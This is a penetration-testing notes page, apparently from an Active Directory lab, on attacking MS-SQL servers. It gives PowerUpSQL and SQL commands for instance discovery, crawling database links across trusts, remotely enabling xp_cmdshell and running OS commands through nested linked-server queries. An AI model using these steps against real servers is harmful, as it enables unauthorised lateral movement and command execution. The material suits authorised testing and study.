---
title: "MS-SQL Servers"
description: "Attacks against MS-SQL servers."
lead: "Attacks against MS-SQL servers, such as database links, using PowerUpSQL."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "trust_attacks"
weight: 30
toc: true
---

## General

- Generally deployed in a lot of Windows domains
- Good option for lateral movement as domain users can be mapped to database roles
- We can use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) for exploitation
- [Cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

## Exploitation

### Enumeration

```powershell
# Discovery (SPN Scanning)
Get-SQLInstanceDomain

# Check accessibility
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Gather information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### Database Links

- Database link allows a SQL Server to access exteranl data sources like other SQL server and OLE DB data sources
- For links between SQL servers, we can exectue stored procedures
- Links work across forest trusts

#### Using PowerUpSQL

```powershell
# Look for links to remote server
Get-SQLServerLink -Instance dcorp-mssql -Verbose

# Enumerate database links
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

# Execute commands
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"
```

#### Using SQL Queries

```sql
/* Enumerate database links */
select * from master..sysservers

/* Run queries on a linked database through OpenQuery() */
select * from openquery("dcorp-sql1", "select * from master..sysservers")

/* Chain queries to access nested links */
select * from openquery("dcorp-sql", 'select * from openquery("dcorp-mgmt", "select * from master..sysservers")')

/* Enable xp_cmdshell */
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"

/* Execute commands using nested link queries */
select * from openquery("dcorp-sql1", 'select * from openquery("dcorp-mgmt", "select * from openquery("eu-sql.eu.eurocorp.local", ""select @@version as version; exec master..xp_cmdshell "powershell whoami)"")")')
```
